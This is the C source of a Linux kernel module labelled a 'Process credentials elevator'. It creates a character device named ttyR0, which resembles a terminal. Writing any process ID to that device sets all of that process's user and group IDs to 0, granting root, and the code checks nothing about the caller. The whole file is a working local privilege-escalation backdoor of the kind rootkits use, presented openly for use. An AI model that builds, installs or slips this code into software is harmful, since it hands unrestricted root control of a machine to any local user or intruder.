#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/device.h>
#include <linux/fs.h>
#include <linux/syscalls.h>
#include <linux/cred.h>

#define  DEVICE_NAME "ttyR0"
#define  CLASS_NAME  "ttyR"

MODULE_LICENSE("Dual MIT/GPL");

MODULE_AUTHOR("Omar Mohamed");

MODULE_DESCRIPTION("Process credentials elevator");

MODULE_VERSION("1.0");

static int __init root_init(void);

static void __exit root_exit(void);

static int root_open(struct inode *inode, struct file *f);

static ssize_t root_read(struct file *f, char *buf, size_t len, loff_t *off);

static ssize_t root_write(struct file *f, const char __user *buf, size_t len, loff_t *off);

static int majorNumber;
static struct class *rootcharClass = NULL;
static struct device *rootcharDevice = NULL;

static struct file_operations fops =
        {
                .owner = THIS_MODULE,
                .open = root_open,
                .read = root_read,
                .write = root_write,
        };

static int root_open(struct inode *inode, struct file *f) {
    return 0;
}

static ssize_t root_read(struct file *f, char *buf, size_t len, loff_t *off) {
    return len;
}

static ssize_t root_write(struct file *f, const char __user *buf, size_t len, loff_t *off) {
    char *data;
    const struct cred *cred;
    struct task_struct *task;
    data = (char *) kmalloc(len + 1, GFP_KERNEL);
    if (data) {
        copy_from_user(data, buf, len);
        struct pid * pd;
        long pid;
        if (kstrtol(data, 10, &pid) != 0) {
            printk(KERN_ERR "Elevator: Bad PID!\n");
        } else {
            pd = find_get_pid(pid);
            if (pd){
                task = get_pid_task( pd, PIDTYPE_PID);
                cred = get_task_cred(task);
                uid_t *uid = &cred->uid.val, *euid = &cred->euid.val, *suid = &cred->suid.val, *fsuid = &cred->fsuid.val;
                gid_t *gid = &cred->gid.val, *egid = &cred->egid.val, *sgid = &cred->sgid.val, *fsgid = &cred->fsgid.val;
                *uid = *gid = *euid = *egid = *suid = *sgid = *fsuid = *fsgid = 0;
                printk(KERN_ERR "Elevator: Root access given successfully to %d\n", task->pid);
            } else {
                printk(KERN_ERR "Elevator: Bad PID!\n");
            }
        }
        kfree(data);
    } else {
        printk(KERN_ALERT "Elevator:Unable to allocate memory\n");
    }
    return len;
}

static int __init root_init(void) {

    printk("Elevator: installed\n");
    if ((majorNumber = register_chrdev(0, DEVICE_NAME, &fops)) < 0) {
        printk(KERN_ALERT "Elevator failed to register a major number\n");
        return majorNumber;
    }
    printk(KERN_INFO "Elevator: major number %d\n", majorNumber);

    rootcharClass = class_create(THIS_MODULE, CLASS_NAME);
    if (IS_ERR(rootcharClass)) {
        unregister_chrdev(majorNumber, DEVICE_NAME);
        printk(KERN_ALERT "Elevator: Failed to register device class\n");
        return PTR_ERR(rootcharClass);
    }
    printk(KERN_INFO "Elevator: device class registered successfully\n");

    rootcharDevice = device_create(rootcharClass, NULL,
                                   MKDEV(majorNumber, 0), NULL, DEVICE_NAME);
    if (IS_ERR(rootcharDevice)) {
        class_destroy(rootcharClass);
        unregister_chrdev(majorNumber, DEVICE_NAME);
        printk(KERN_ALERT "Elevator: Failed to create the device\n");
        return PTR_ERR(rootcharDevice);

    }
    return 0;
}

static void __exit root_exit(void) {
    device_destroy(rootcharClass, MKDEV(majorNumber, 0));
    class_unregister(rootcharClass);
    class_destroy(rootcharClass);
    unregister_chrdev(majorNumber, DEVICE_NAME);
    printk(KERN_INFO "Elevator: Uninstalled\n");
}

module_init(root_init);
module_exit(root_exit);